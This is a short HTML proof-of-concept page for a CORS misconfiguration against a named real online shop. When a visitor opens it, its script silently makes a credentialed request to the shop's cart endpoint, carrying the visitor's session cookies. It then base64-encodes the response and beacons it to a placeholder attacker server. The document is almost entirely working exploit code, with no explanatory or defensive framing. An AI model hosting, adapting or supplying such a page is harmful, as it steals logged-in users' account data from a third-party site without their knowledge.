<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>CORS Sandbox PoC</title>
</head>

<body>

<h2>Loading...</h2>

<iframe id="frame" sandbox="allow-scripts allow-same-origin" style="display:none;"></iframe>

<script>

function log(data){
    let img = new Image();
    img.src = "https://your-server.com/log?d=" + btoa(data);
}

async function exploit(){
    try{

        let res = await fetch("https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount", {
            method: "GET",
            credentials: "include"
        });

        let text = await res.text();

        document.body.innerHTML += "<pre>"+text+"</pre>";

        log("SUCCESS: " + text);

    }catch(e){
        log("ERROR: " + e);
    }
}

exploit();

</script>

</body>
</html>
